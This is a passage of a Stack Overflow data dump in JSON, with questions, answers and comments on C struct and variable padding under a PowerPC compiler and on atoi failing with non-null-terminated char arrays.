"@user6261336 Unfortunately compilers I know wouldn&#39;t help you. However, have you looked at the linker options? Manual you linked had several placement related, such as <code>-Xsort-section-by-alignment</code>."}], "answers": [{"comments": [{"owner": {"reputation": 351, "user_id": 3379534, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/250d20a8387d013d5c73684bb0bc2b25?s=128&d=identicon&r=PG&f=1", "display_name": "Linuxxon", "link": "https://stackoverflow.com/users/3379534/linuxxon"}, "edited": false, "score": 0, "creation_date": 1461760862, "post_id": 36889896, "comment_id": 61344513, "body": "Is the compoiler not allowed to arrange variable declarations freely, or perhaps only when optimizations are flagged?"}, {"owner": {"reputation": 16415, "user_id": 1070117, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/075d11243bc7564b736ad01169e12bd7?s=128&d=identicon&r=PG", "display_name": "Leandros", "link": "https://stackoverflow.com/users/1070117/leandros"}, "reply_to_user": {"reputation": 351, "user_id": 3379534, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/250d20a8387d013d5c73684bb0bc2b25?s=128&d=identicon&r=PG&f=1", "display_name": "Linuxxon", "link": "https://stackoverflow.com/users/3379534/linuxxon"}, "edited": false, "score": 1, "creation_date": 1461761187, "post_id": 36889896, "comment_id": 61344763, "body": "@Linuxxon The compiler is not allowed to re-arrange variables in a struct."}, {"owner": {"reputation": 205167, "user_id": 4323, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/qqgFU.png?s=128&g=1", "display_name": "John Zwinck", "link": "https://stackoverflow.com/users/4323/john-zwinck"}, "reply_to_user": {"reputation": 351, "user_id": 3379534, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/250d20a8387d013d5c73684bb0bc2b25?s=128&d=identicon&r=PG&f=1", "display_name": "Linuxxon", "link": "https://stackoverflow.com/users/3379534/linuxxon"}, "edited": false, "score": 0, "creation_date": 1461761191, "post_id": 36889896, "comment_id": 61344768, "body": "@Linuxxon: In limited cases maybe, but in general no, because for example in my struct above, the programmer may rely on the ordering of the fields (e.g. they may memcpy the struct to/from network messages)."}, {"owner": {"reputation": 351, "user_id": 3379534, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/250d20a8387d013d5c73684bb0bc2b25?s=128&d=identicon&r=PG&f=1", "display_name": "Linuxxon", "link": "https://stackoverflow.com/users/3379534/linuxxon"}, "reply_to_user": {"reputation": 16415, "user_id": 1070117, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/075d11243bc7564b736ad01169e12bd7?s=128&d=identicon&r=PG", "display_name": "Leandros", "link": "https://stackoverflow.com/users/1070117/leandros"}, "edited": false, "score": 0, "creation_date": 1461762085, "post_id": 36889896, "comment_id": 61345482, "body": "@Leandros yeah, but the variables aren&#39;t in a struct in the question which was what I was thinking of. Is it still the same?"}, {"owner": {"reputation": 205167, "user_id": 4323, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/qqgFU.png?s=128&g=1", "display_name": "John Zwinck", "link": "https://stackoverflow.com/users/4323/john-zwinck"}, "reply_to_user": {"reputation": 351, "user_id": 3379534, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/250d20a8387d013d5c73684bb0bc2b25?s=128&d=identicon&r=PG&f=1", "display_name": "Linuxxon", "link": "https://stackoverflow.com/users/3379534/linuxxon"}, "edited": false, "score": 1, "creation_date": 1461762144, "post_id": 36889896, "comment_id": 61345539, "body": "@Linuxxon: I think in some limited cases, perhaps including the case in your question using global variables, it might be possible to do reordering.  But I&#39;ve never seen a compiler that did it."}, {"owner": {"reputation": 351, "user_id": 3379534, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/250d20a8387d013d5c73684bb0bc2b25?s=128&d=identicon&r=PG&f=1", "display_name": "Linuxxon", "link": "https://stackoverflow.com/users/3379534/linuxxon"}, "edited": false, "score": 0, "creation_date": 1461762478, "post_id": 36889896, "comment_id": 61345822, "body": "@JohnZwinck: Okay, thanks for answering. I just have some memory of discussing this in a computer architecture class. It wasn&#39;t x86 so might not hold true outside that architecture."}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "reply_to_user": {"reputation": 351, "user_id": 3379534, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/250d20a8387d013d5c73684bb0bc2b25?s=128&d=identicon&r=PG&f=1", "display_name": "Linuxxon", "link": "https://stackoverflow.com/users/3379534/linuxxon"}, "edited": false, "score": 0, "creation_date": 1461763173, "post_id": 36889896, "comment_id": 61346403, "body": "@Linuxxon Compiler and linker can re-arrange variables if those variable belongs in different section <a href=\"https://en.wikipedia.org/wiki/Data_segment\" rel=\"nofollow noreferrer\">data or bss</a>"}, {"owner": {"reputation": 16415, "user_id": 1070117, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/075d11243bc7564b736ad01169e12bd7?s=128&d=identicon&r=PG", "display_name": "Leandros", "link": "https://stackoverflow.com/users/1070117/leandros"}, "edited": false, "score": 0, "creation_date": 1461763846, "post_id": 36889896, "comment_id": 61346945, "body": "Theoretically could it be possible that stack variables are re-arranged (I don&#39;t know if it&#39;s legal in terms of the C standard). I&#39;ve tested it real quick with GCC and clang, and neither of these re-arranges any stack allocations."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "edited": false, "score": 0, "creation_date": 1461765123, "post_id": 36889896, "comment_id": 61348002, "body": "I don&#39;t see how this answers question at all. Structure fields are handled differently from global variables. Yes, it&#39;s due to alignment, but any half-good compiler could handle that for global variables."}], "tags": [], "owner": {"reputation": 205167, "user_id": 4323, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/qqgFU.png?s=128&g=1", "display_name": "John Zwinck", "link": "https://stackoverflow.com/users/4323/john-zwinck"}, "is_accepted": false, "score": 2, "last_activity_date": 1461760245, "creation_date": 1461760245, "answer_id": 36889896, "question_id": 36889773, "link": "https://stackoverflow.com/questions/36889773/differing-ram-consumption-due-to-variable-ordering/36889896#36889896", "title": "Differing RAM consumption due to variable ordering", "body": "<p>Your compiler is padding the <code>long</code> after <code>char</code> to preserve alignment.  You might possibly find a way to disable this, but it's not  generally a good idea.  Instead, it is up to you to pack your variables efficiently--this is something that needs to be done even in some cases on full-size computers, not just embedded.  For example:</p>\n\n<pre><code>struct thing\n{\n    char c1;\n    int i1;\n    char c2;\n    int i2;\n    char c3;\n    int i3;\n};\n</code></pre>\n\n<p>The above is bad, because it wastes 9 bytes on padding, bringing the total size to 24 bytes when it should be just 16.  If you create lots of such objects, you're wasting a third of your memory (RAM, but more importantly cache).</p>\n"}], "owner": {"reputation": 19, "user_id": 6261336, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f0aa148c78791b1f37ee14fa91754b5?s=128&d=identicon&r=PG&f=1", "display_name": "user6261336", "link": "https://stackoverflow.com/users/6261336/user6261336"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1461760245, "creation_date": 1461759873, "question_id": 36889773, "link": "https://stackoverflow.com/questions/36889773/differing-ram-consumption-due-to-variable-ordering", "title": "Differing RAM consumption due to variable ordering", "body": "<p>Summary:\nIt seems the RAM consumption of c code depends on variable ordering. Is there a way to automatically optimize it?</p>\n\n<p>Longer version:\nHere I paste two versions of code that differ only in variable ordering.</p>\n\n<p>Version 1:</p>\n\n<pre><code>static unsigned long b=1;\nstatic unsigned char a=1;\n\nunsigned long myfunc(){\n  return a+b;\n}\n</code></pre>\n\n<p>Version 2:</p>\n\n<pre><code>static unsigned char a=1;\nstatic unsigned long b=1;\n\nunsigned long myfunc(){\n  return a+b;\n}\n</code></pre>\n\n<p>Compile with DIAB compiler for PowerPC arch, using following compiler options, and check the size of ram-consumption in both object files using gnu's size utility I find a difference of 3 bytes.</p>\n\n<pre><code>dcc.exe  -Xsmall-data=10 -tPPCE200Z4VFF:simple -c -o version1.o version1.c\n</code></pre>\n\n<p>The RAM consumption for first case is 5 bytes whereas for second case it is 8 bytes. Should it be like this?</p>\n\n<p>The difference in the generated assembly for both cases is also just the order of the variables. Is there a way to automatically optimize the variable ordering to save RAM? I guess the ordering should always be according to decreasing size of the variables.</p>\n\n<p>Reference:\nDiab compiler options:\n<a href=\"http://www.embedded-tools.de/sites/default/files/pdf/wr_diab_compiler_options_reference_5.9.3-R2.pdf\" rel=\"nofollow\">http://www.embedded-tools.de/sites/default/files/pdf/wr_diab_compiler_options_reference_5.9.3-R2.pdf</a></p>\n"}, {"tags": ["c", "arrays", "string", "integer"], "comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 3, "creation_date": 1461759568, "post_id": 36889560, "comment_id": 61343415, "body": "The argument to <code>atoi</code> must be a string. You didn&#39;t supply a string. A string is a sequence of characters followed by a null byte."}, {"owner": {"reputation": 8251, "user_id": 2912665, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/XrRhd.jpg?s=128&g=1", "display_name": "CinCout", "link": "https://stackoverflow.com/users/2912665/cincout"}, "edited": false, "score": 1, "creation_date": 1461759636, "post_id": 36889560, "comment_id": 61343498, "body": "<code>num[2]</code> can take only 1 character as the second one will be a <code>&#39;\\0&#39;</code>"}, {"owner": {"reputation": 1560, "user_id": 4303216, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-crjc3oGU_5c/AAAAAAAAAAI/AAAAAAAAADc/BTLu8OHFfRM/photo.jpg?sz=128", "display_name": "sameera sy", "link": "https://stackoverflow.com/users/4303216/sameera-sy"}, "edited": false, "score": 0, "creation_date": 1461759756, "post_id": 36889560, "comment_id": 61343599, "body": "working perfectly in my system, which version of <code>gcc</code> are you using?"}, {"owner": {"reputation": 7540, "user_id": 4400804, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/ae6154c51ff5832ca23eb2ca5fb18aef?s=128&d=identicon&r=PG&f=1", "display_name": "deltaskelta", "link": "https://stackoverflow.com/users/4400804/deltaskelta"}, "edited": false, "score": 0, "creation_date": 1461759826, "post_id": 36889560, "comment_id": 61343668, "body": "when I type gcc --version I get this <code>Apple LLVM version 7.3.0 (clang-703.0.29)</code>"}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "reply_to_user": {"reputation": 1560, "user_id": 4303216, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-crjc3oGU_5c/AAAAAAAAAAI/AAAAAAAAADc/BTLu8OHFfRM/photo.jpg?sz=128", "display_name": "sameera sy", "link": "https://stackoverflow.com/users/4303216/sameera-sy"}, "edited": false, "score": 3, "creation_date": 1461759827, "post_id": 36889560, "comment_id": 61343672, "body": "@sameerasy It is only Undefined Behaviour. On your system the first byte after <code>num[1]</code> is set to <code>0x00</code>."}, {"owner": {"reputation": 3273, "user_id": 5021963, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/t7Qsr.png?s=128&g=1", "display_name": "Ed de Almeida", "link": "https://stackoverflow.com/users/5021963/ed-de-almeida"}, "edited": false, "score": 1, "creation_date": 1461759838, "post_id": 36889560, "comment_id": 61343684, "body": "You are using a fixed length jump <b>i+=3</b> from one element to the next. It is going to fail when numbers are bigger then two digits. This is why it fails when it reaches 500 (three digits). Try to separate numbers in the list by the space, not by the length of the jump."}, {"owner": {"reputation": 7540, "user_id": 4400804, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/ae6154c51ff5832ca23eb2ca5fb18aef?s=128&d=identicon&r=PG&f=1", "display_name": "deltaskelta", "link": "https://stackoverflow.com/users/4400804/deltaskelta"}, "reply_to_user": {"reputation": 3273, "user_id": 5021963, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/t7Qsr.png?s=128&g=1", "display_name": "Ed de Almeida", "link": "https://stackoverflow.com/users/5021963/ed-de-almeida"}, "edited": false, "score": 0, "creation_date": 1461760023, "post_id": 36889560, "comment_id": 61343843, "body": "@Ed, but it should never reach 500 anyway because this list happens to be perfectly spaced throughout the whole thing with two digits... How would one go about separating by space?"}, {"owner": {"reputation": 3273, "user_id": 5021963, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/t7Qsr.png?s=128&g=1", "display_name": "Ed de Almeida", "link": "https://stackoverflow.com/users/5021963/ed-de-almeida"}, "edited": false, "score": 0, "creation_date": 1461764132, "post_id": 36889560, "comment_id": 61347183, "body": "A regular expression, maybe."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461765548, "post_id": 36889560, "comment_id": 61348380, "body": "Side question: Why did code use <code>&quot;%lu&quot;</code> to go with <code>strlen(x)</code>?  Was  <code>&quot;%u&quot;</code>, <code>&quot;%ld&quot;</code> or <code>&quot;%zu&quot;</code> considered?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 3273, "user_id": 5021963, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/t7Qsr.png?s=128&g=1", "display_name": "Ed de Almeida", "link": "https://stackoverflow.com/users/5021963/ed-de-almeida"}, "edited": false, "score": 1, "creation_date": 1461765802, "post_id": 36889560, "comment_id": 61348593, "body": "@Ed &quot;It is going to fail when numbers are bigger then two digits.&quot;--&gt; disagree.  Even on the first iteration, <code>atoi(num)</code> is using <code>num</code>, which accesses outside <code>num[]</code>.  result :UB."}, {"owner": {"reputation": 3273, "user_id": 5021963, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/t7Qsr.png?s=128&g=1", "display_name": "Ed de Almeida", "link": "https://stackoverflow.com/users/5021963/ed-de-almeida"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461779382, "post_id": 36889560, "comment_id": 61358660, "body": "You are probably right, @chux. I only looked at the problem in a hurry."}, {"owner": {"reputation": 14308, "user_id": 1989425, "user_type": "registered", "accept_rate": 38, "profile_image": "https://i.stack.imgur.com/aGyIU.png?s=128&g=1", "display_name": "autistic", "link": "https://stackoverflow.com/users/1989425/autistic"}, "edited": false, "score": 0, "creation_date": 1530801531, "post_id": 36889560, "comment_id": 89369556, "body": "There are gremlins using <code>%lu</code> to print a <code>size_t</code>... You should use <code>%zu</code> in this question... this is another example of that <i>pesky</i> undefined behaviour."}], "answers": [{"comments": [{"owner": {"reputation": 7540, "user_id": 4400804, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/ae6154c51ff5832ca23eb2ca5fb18aef?s=128&d=identicon&r=PG&f=1", "display_name": "deltaskelta", "link": "https://stackoverflow.com/users/4400804/deltaskelta"}, "edited": false, "score": 0, "creation_date": 1461760219, "post_id": 36889697, "comment_id": 61343986, "body": "I see what you are saying and it works, but can you tell me why it was working 9 times out of 10 and then failing on only a few numbers?"}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "reply_to_user": {"reputation": 7540, "user_id": 4400804, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/ae6154c51ff5832ca23eb2ca5fb18aef?s=128&d=identicon&r=PG&f=1", "display_name": "deltaskelta", "link": "https://stackoverflow.com/users/4400804/deltaskelta"}, "edited": false, "score": 1, "creation_date": 1461760468, "post_id": 36889697, "comment_id": 61344165, "body": "@deltaskelta As I commented it is Undefined Behavior, that means you cannot predict what happen. <code>num</code> is stack allocated and at a certain point of execution the 1st byte after <code>num[1]</code> change its value and gives you those weird output."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 2, "creation_date": 1461760487, "post_id": 36889697, "comment_id": 61344181, "body": "No, that is undefined behavior, and explaining what really happens require to dive into implementation details (compiler, processor, callstack , OS)"}, {"owner": {"reputation": 7540, "user_id": 4400804, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/ae6154c51ff5832ca23eb2ca5fb18aef?s=128&d=identicon&r=PG&f=1", "display_name": "deltaskelta", "link": "https://stackoverflow.com/users/4400804/deltaskelta"}, "edited": false, "score": 0, "creation_date": 1461760697, "post_id": 36889697, "comment_id": 61344371, "body": "ahh ok, so because I didn&#39;t properly end the string....it was reading some random next byte out of memory somewhere that gave it whacky values? Is this correct?"}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "reply_to_user": {"reputation": 7540, "user_id": 4400804, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/ae6154c51ff5832ca23eb2ca5fb18aef?s=128&d=identicon&r=PG&f=1", "display_name": "deltaskelta", "link": "https://stackoverflow.com/users/4400804/deltaskelta"}, "edited": false, "score": 0, "creation_date": 1461760931, "post_id": 36889697, "comment_id": 61344565, "body": "@deltaskelta Yes, it is exactly what happened."}], "tags": [], "owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "is_accepted": true, "score": 13, "last_activity_date": 1461759695, "creation_date": 1461759695, "answer_id": 36889697, "question_id": 36889560, "link": "https://stackoverflow.com/questions/36889560/c-turning-char-arrays-into-int-behaving-weird/36889697#36889697", "title": "C turning char arrays into int behaving weird", "body": "<p>As you can see <a href=\"http://www.tutorialspoint.com/c_standard_library/c_function_atoi.htm\" rel=\"noreferrer\">atoi</a> wants a C-String: a null terminated array of character.</p>\n\n<p>So, this</p>\n\n<pre><code>    char num[2];\n    num[0] = (char)x[i];\n    num[1] = (char)x[i+1];\n</code></pre>\n\n<p>Have to be</p>\n\n<pre><code>    char num[3] = {0};\n    num[0] = (char)x[i];\n    num[1] = (char)x[i+1];        \n    num[2] = '\\0'; // this could be avoided in your specific case\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 4396, "user_id": 1043773, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/7a5453bbc3f198ebef8e8d44253a1503?s=128&d=identicon&r=PG", "display_name": "bashrc", "link": "https://stackoverflow.com/users/1043773/bashrc"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1461761683, "post_id": 36889796, "comment_id": 61345163, "body": "@LPs and where am I denying that?i have mentioned that in the answer and in the example. The OP wanted a why and gave the answer to the why. If you are the down voter would you please consider reading my answer again?"}, {"owner": {"reputation": 4396, "user_id": 1043773, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/7a5453bbc3f198ebef8e8d44253a1503?s=128&d=identicon&r=PG", "display_name": "bashrc", "link": "https://stackoverflow.com/users/1043773/bashrc"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1461761905, "post_id": 36889796, "comment_id": 61345362, "body": "@LPs num[0] and num[1]=space will indeed be converted to 1 because atoi will stop processing after looking at the whitespace. The first iteration is perfectly defined behavior."}], "tags": [], "owner": {"reputation": 4396, "user_id": 1043773, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/7a5453bbc3f198ebef8e8d44253a1503?s=128&d=identicon&r=PG", "display_name": "bashrc", "link": "https://stackoverflow.com/users/1043773/bashrc"}, "is_accepted": false, "score": 0, "last_activity_date": 1461763693, "last_edit_date": 1461763693, "creation_date": 1461759952, "answer_id": 36889796, "question_id": 36889560, "link": "https://stackoverflow.com/questions/36889560/c-turning-char-arrays-into-int-behaving-weird/36889796#36889796", "title": "C turning char arrays into int behaving weird", "body": "<pre><code> num[0] = (char)x[i];\n num[1] = (char)x[i+1];\n printf(\"%d, \", atoi(num)\n</code></pre>\n\n<p>This assumes that the number of digits in your input will always be 2(for which num should be declared as char num[3].  Do a dry run of your logic with a smaller input set, for eg:<code>\"01 50\"</code></p>\n\n<pre><code>i=0\nnum[0] = *(num+0) = 0 \nnum[1] = *(num+1) = &lt;space&gt; \nnum[2] = *(num + 2) = ????? Since this memory is not allocated for num\nprintf(\"%d, \", atoi(\"1&lt;space&gt;\")) = 1 (atoi stops after looking at num[1] which is a non-digit character)\n\ni = 3\nnum[0] = *(num+0) = 0 \nnum[1] = *(num + 1) =  0\nnum[2] = *(num + 2) = ?????\nprintf(\"%d \", atoi(\"00&lt;garbage&gt;...\")) // this is UB since atoi will definitely read memory at  `(num + 2)` which is beyond the bounds of what the compiler allocated for it.\n</code></pre>\n\n<p>Try using sscanf to parse the input rather than relying on the number of digits. That would be much more cleaner and less prone to errors.</p>\n\n<pre><code>int main () \n{\n    char x[60] = \"08 02 22 97 38 15 00 40 00 75 04 05 07 78 52 12 50 77 91 08\";\n    const char *y = x;\n    char outputBuffer[10];\n    for(;sscanf(y, \"%s\", outputBuffer) &gt; 0; y+=strlen(outputBuffer)) printf(\"%d, \", atoi(outputBuffer));\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 19601, "user_id": 1620779, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/dlgGb.png?s=128&g=1", "display_name": "sjsam", "link": "https://stackoverflow.com/users/1620779/sjsam"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1461761489, "post_id": 36890015, "comment_id": 61345011, "body": "@LPs : Fixed that."}], "tags": [], "owner": {"reputation": 19601, "user_id": 1620779, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/dlgGb.png?s=128&g=1", "display_name": "sjsam", "link": "https://stackoverflow.com/users/1620779/sjsam"}, "is_accepted": false, "score": 0, "last_activity_date": 1461761472, "last_edit_date": 1461761472, "creation_date": 1461760565, "answer_id": 36890015, "question_id": 36889560, "link": "https://stackoverflow.com/questions/36889560/c-turning-char-arrays-into-int-behaving-weird/36890015#36890015", "title": "C turning char arrays into int behaving weird", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main () \n{\n    char num[3]; // 3rd byte is the null character\n    num[3]='\\0';\n    char x[60] = \"08 02 22 97 38 15 00 40 00 75 04 05 07 78 52 12 50 77 91 08\";\n    printf(\"%lu\\n\\n\", strlen(x));\n\n    for ( int i = 0; i &lt; strlen(x); i+=3 ) {\n        strncpy ( num, x+i, 2 ); // Copies two characters starting from x+i\n        // You get a null terminated string num here.\n        printf(\"%d, \", atoi(num));\n    }\nprintf(\"\\n\");\n\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "is_accepted": false, "score": 0, "last_activity_date": 1462481710, "last_edit_date": 1462481710, "creation_date": 1461762278, "answer_id": 36890714, "question_id": 36889560, "link": "https://stackoverflow.com/questions/36889560/c-turning-char-arrays-into-int-behaving-weird/36890714#36890714", "title": "C turning char arrays into int behaving weird", "body": "<p>The answer to your question has already been provided, i.e. that a C string is by definition a NULL terminated char array. Without room for the NULL terminator, at best the results from a string passed to a string function cannot be trusted.  </p>\n\n<p>I am offering this just to highlight some additional ideas on reading a <code>char</code> array into <code>int</code> array, where the NULL terminator becomes almost a non-issue.  </p>\n\n<p>The following method includes simple string parsing and dynamic memory usage,  where the string contents get read directly into <code>int</code> memory, bypassing any need for an intermediate string buffer, resulting in the ability to read any <em><a href=\"https://msdn.microsoft.com/en-us/library/s3f49ktz.aspx\" rel=\"nofollow\">legal integer length</a></em> from the string, and convert directly into <code>int</code>:  </p>\n\n<p>see inline comments for suggestions:</p>\n\n<pre><code>int main(void)\n{\n    //leave array index blank, the compiler will size it for you\n    char x[] = \"08 0223 22 97 382345 15 00 40 00 75 04 05 07 78 52 12 50 77 91 08 1000\";\n    //    ^\n    int size = sizeof(x)/sizeof(x[0]);//use sizeof macro to get number of elements in array\n    char *tok = NULL;\n    int i = 0;\n    int count=0;\n    for(i=0;i&lt;size;i++)\n    {\n        if(x[i]==' ')count++;//get count to size int array\n    }\n    int *array = malloc((count+1)*sizeof(int));\n    if(array)\n    {\n        i=0;//reinitialize to 0 for use here\n        tok = strtok(x, \" \\n\");\n        while(tok)//test after each parse before processing\n        {\n            if((i&gt;0)&amp;&amp;(i%6==0))printf(\"\\n\");//newlines to format\n            array[i++] = atoi(tok);\n            printf(\"%6d, \", array[i]);\n            //       ^ provide spacing in output\n            tok = strtok(NULL, \" \\n\");\n        }\n        free(array);\n    }\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 1, "last_activity_date": 1461766465, "creation_date": 1461766465, "answer_id": 36892448, "question_id": 36889560, "link": "https://stackoverflow.com/questions/36889560/c-turning-char-arrays-into-int-behaving-weird/36892448#36892448", "title": "C turning char arrays into int behaving weird", "body": "<p>The need for a proper string with its null character has been posted by many.</p>\n\n<p>Just wanted to add another coding idea: compound literal. <code>(char[]) { x[i], x[i + 1], '\\0' }</code> to implement that.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main(void) {\n  char x[] = \"08 02 22 97 38 15 00 40 00 75 04 05 07 78 52 12 50 77 91 08\";\n  size_t len = strlen(x);\n  printf(\"%zu\\n\\n\", len);\n\n  for (size_t i = 0; i &lt; len; i += 3) {\n    printf(\"%d, \", atoi((char[] ) { x[i], x[i + 1], '\\0' }));\n  }\n}\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>59\n\n8, 2, 22, 97, 38, 15, 0, 40, 0, 75, 4, 5, 7, 78, 52, 12, 50, 77, 91, 8, \n</code></pre>\n\n<p>Some other fixes made too.</p>\n"}], "owner": {"reputation": 7540, "user_id": 4400804, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/ae6154c51ff5832ca23eb2ca5fb18aef?s=128&d=identicon&r=PG&f=1", "display_name": "deltaskelta", "link": "https://stackoverflow.com/users/4400804/deltaskelta"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 220, "favorite_count": 0, "accepted_answer_id": 36889697, "answer_count": 5, "score": 6, "last_activity_date": 1462481710, "creation_date": 1461759357, "question_id": 36889560, "link": "https://stackoverflow.com/questions/36889560/c-turning-char-arrays-into-int-behaving-weird", "title": "C turning char arrays into int behaving weird", "body": "<p>I have a much longer char array that I am turning into integers, but I cannot figure out why it behaves weird in some spots. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main () \n{\n    char x[60] = \"08 02 22 97 38 15 00 40 00 75 04 05 07 78 52 12 50 77 91 08\";\n    printf(\"%lu\\n\\n\", 